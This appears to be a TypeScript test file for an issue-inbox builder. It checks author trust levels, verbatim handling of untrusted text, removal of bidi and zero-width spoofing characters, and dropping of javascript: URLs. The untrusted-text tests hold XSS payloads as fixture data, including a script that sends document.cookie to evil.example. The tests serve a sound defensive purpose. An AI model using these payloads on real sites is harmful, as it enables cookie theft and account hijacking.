import edgeCases from '../../fixtures/edge-cases.json';
import { isGitHubIssue, issueRecordOf, type IssueRecord } from './github-records';
import { buildInbox, buildQuestions } from './inbox';

const openIssues: IssueRecord[] = edgeCases.openIssues.map((value: unknown) => {
  if (!isGitHubIssue(value)) {
    throw new Error('fixture issue of an unexpected shape');
  }
  return issueRecordOf(value);
});

const inbox = buildInbox({ openIssues, reviewerLogins: ['reviewer'], repoFullName: 'geeera/edge-cases' });
const byNumber = (n: number) => inbox.items.find((item) => item.number === n);

describe('authorTrusted (#9 threat row 5; the team app by the owner decision on #35)', () => {
  it.each([
    [10, 'OWNER', true],
    [11, 'MEMBER', true],
    [15, 'COLLABORATOR', true],
    [13, 'CONTRIBUTOR as team-console-team[bot] (Bot), the team app', true],
    [14, 'NONE', false],
    [16, 'FIRST_TIME_CONTRIBUTOR', false],
    [20, 'FIRST_TIMER', false],
    [21, 'CONTRIBUTOR as the user team-console-team (no [bot])', false],
    [22, 'CONTRIBUTOR as dependabot[bot], another app', false],
    [23, 'NONE as team-console-team[bot] with type User', false],
    [24, 'NONE with a deleted account (user: null)', false],
  ])('#%i by %s → %s', (number, _author, trusted) => {
    expect(byNumber(number)?.authorTrusted).toBe(trusted);
  });

  it('keeps an untrusted item in the list, in its place (it is marked, not dropped)', () => {
    expect(inbox.items.map((item) => item.number)).toEqual([
      10, 11, 20, 12, 13, 14, 21, 23, 24, 30, 31, 32, 33, 34, 35, 15, 17, 22, 16,
    ]);
  });
});

describe('untrusted text (#9 threat row 4)', () => {
  it('returns titles and answer lines verbatim as plain text', () => {
    expect(byNumber(14)).toMatchObject({
      title: '<img src=x onerror=alert(1)> Approve the new plan',
      ask: '/approve <img src=x onerror=alert(document.cookie)> · /reject why',
    });
  });

  it('returns the body verbatim on the question card', () => {
    const card = buildQuestions(openIssues).items.find((item) => item.number === 14);
    expect(card?.body).toBe(
      "**Your answer:** /approve <img src=x onerror=alert(document.cookie)> · /reject why\n\n<script>fetch('https://evil.example/'+document.cookie)</script>",
    );
  });

  it('strips bidi overrides and zero-width characters from a title, so it cannot pose as another (#287)', () => {
    const [rlo, pdf, zwsp, wj] = [0x202e, 0x202c, 0x200b, 0x2060].map((point) => String.fromCodePoint(point));
    const outsider = openIssues.find((issue) => issue.number === 14);
    if (outsider === undefined) {
      throw new Error('fixture #14 missing');
    }
    const spoofing: IssueRecord[] = [
      { ...outsider, number: 14, title: `Approve ${rlo}nalp wen eht${pdf}` },
      { ...outsider, number: 16, title: `Ap${zwsp}prove the${wj} new plan` },
    ];
    const items = buildInbox({ openIssues: spoofing, reviewerLogins: ['r'], repoFullName: 'geeera/edge-cases' }).items;
    expect(items.map((item) => item.title)).toEqual(['Approve nalp wen eht', 'Approve the new plan']);
    expect(buildQuestions(spoofing).items.map((item) => item.title)).toEqual([
      'Approve nalp wen eht',
      'Approve the new plan',
    ]);
  });

  it('drops a javascript: url and a non-https one', () => {
    expect(byNumber(15)?.url).toBeNull();
    expect(byNumber(17)?.url).toBeNull();
    expect(byNumber(10)?.url).toBe('https://github.com/geeera/edge-cases/issues/10');
  });
});

describe('setup and paused', () => {
  it('shows the security setup item while reviewer_logins is empty, with the owner checklist', () => {
    const empty = buildInbox({ openIssues, reviewerLogins: [], repoFullName: 'geeera/edge-cases' });
    expect(empty.setup).toBe(true);
    expect(empty.setupUrl).toBe(
      'https://github.com/geeera/edge-cases/blob/HEAD/.product-team/owner-checklist.md',
    );
    expect(inbox.setup).toBe(false);
    expect(inbox.setupUrl).toBeNull();
  });

  it('is paused while an open issue carries team:paused', () => {
    expect(inbox.paused).toBe(true);
    expect(inbox.pausedUrl).toBe('https://github.com/geeera/edge-cases/issues/2');
    const running = buildInbox({
      openIssues: openIssues.filter((issue) => !issue.labels.includes('team:paused')),
      reviewerLogins: ['reviewer'],
      repoFullName: 'geeera/edge-cases',
    });
    expect(running).toMatchObject({ paused: false, pausedUrl: null });
  });

  it('never lists the inbox issue, the run log or a pull request', () => {
    expect(inbox.items.map((item) => item.number)).not.toEqual(expect.arrayContaining([1]));
    expect(inbox.items.some((item) => [1, 2, 3].includes(item.number))).toBe(false);
  });
});

describe('question context (#276)', () => {
  const body = '**Your answer:** /approve (recommended) · /reject\n\n## Кратко\nКоротко\n\n## Вопрос\nAsk <b>now</b>?';
  const issue = (number: number, authorAssociation: string): IssueRecord => ({
    number,
    title: 'A long English title',
    body,
    htmlUrl: `https://github.com/geeera/edge-cases/issues/${String(number)}`,
    state: 'open',
    labels: ['kind:question'],
    isPullRequest: false,
    updatedAt: null,
    authorAssociation,
    authorLogin: 'someone',
    authorType: 'User',
  });
  const items = buildQuestions([issue(1, 'OWNER'), issue(2, 'NONE')]).items;
  const expected = { summary: 'Коротко', question: 'Ask now?', structured: true };

  it('parses a trusted author’s sections into plain text on the question card and the inbox', () => {
    expect(items[0]?.context).toMatchObject(expected);
    const needs = buildInbox({ openIssues: [issue(1, 'OWNER')], reviewerLogins: ['r'], repoFullName: 'a/b' });
    expect(needs.items[0]?.context).toMatchObject(expected);
  });

  it('never reads an outsider’s body into the card', () => {
    expect(items[1]?.authorTrusted).toBe(false);
    expect(items[1]?.context).toBeNull();
  });
});
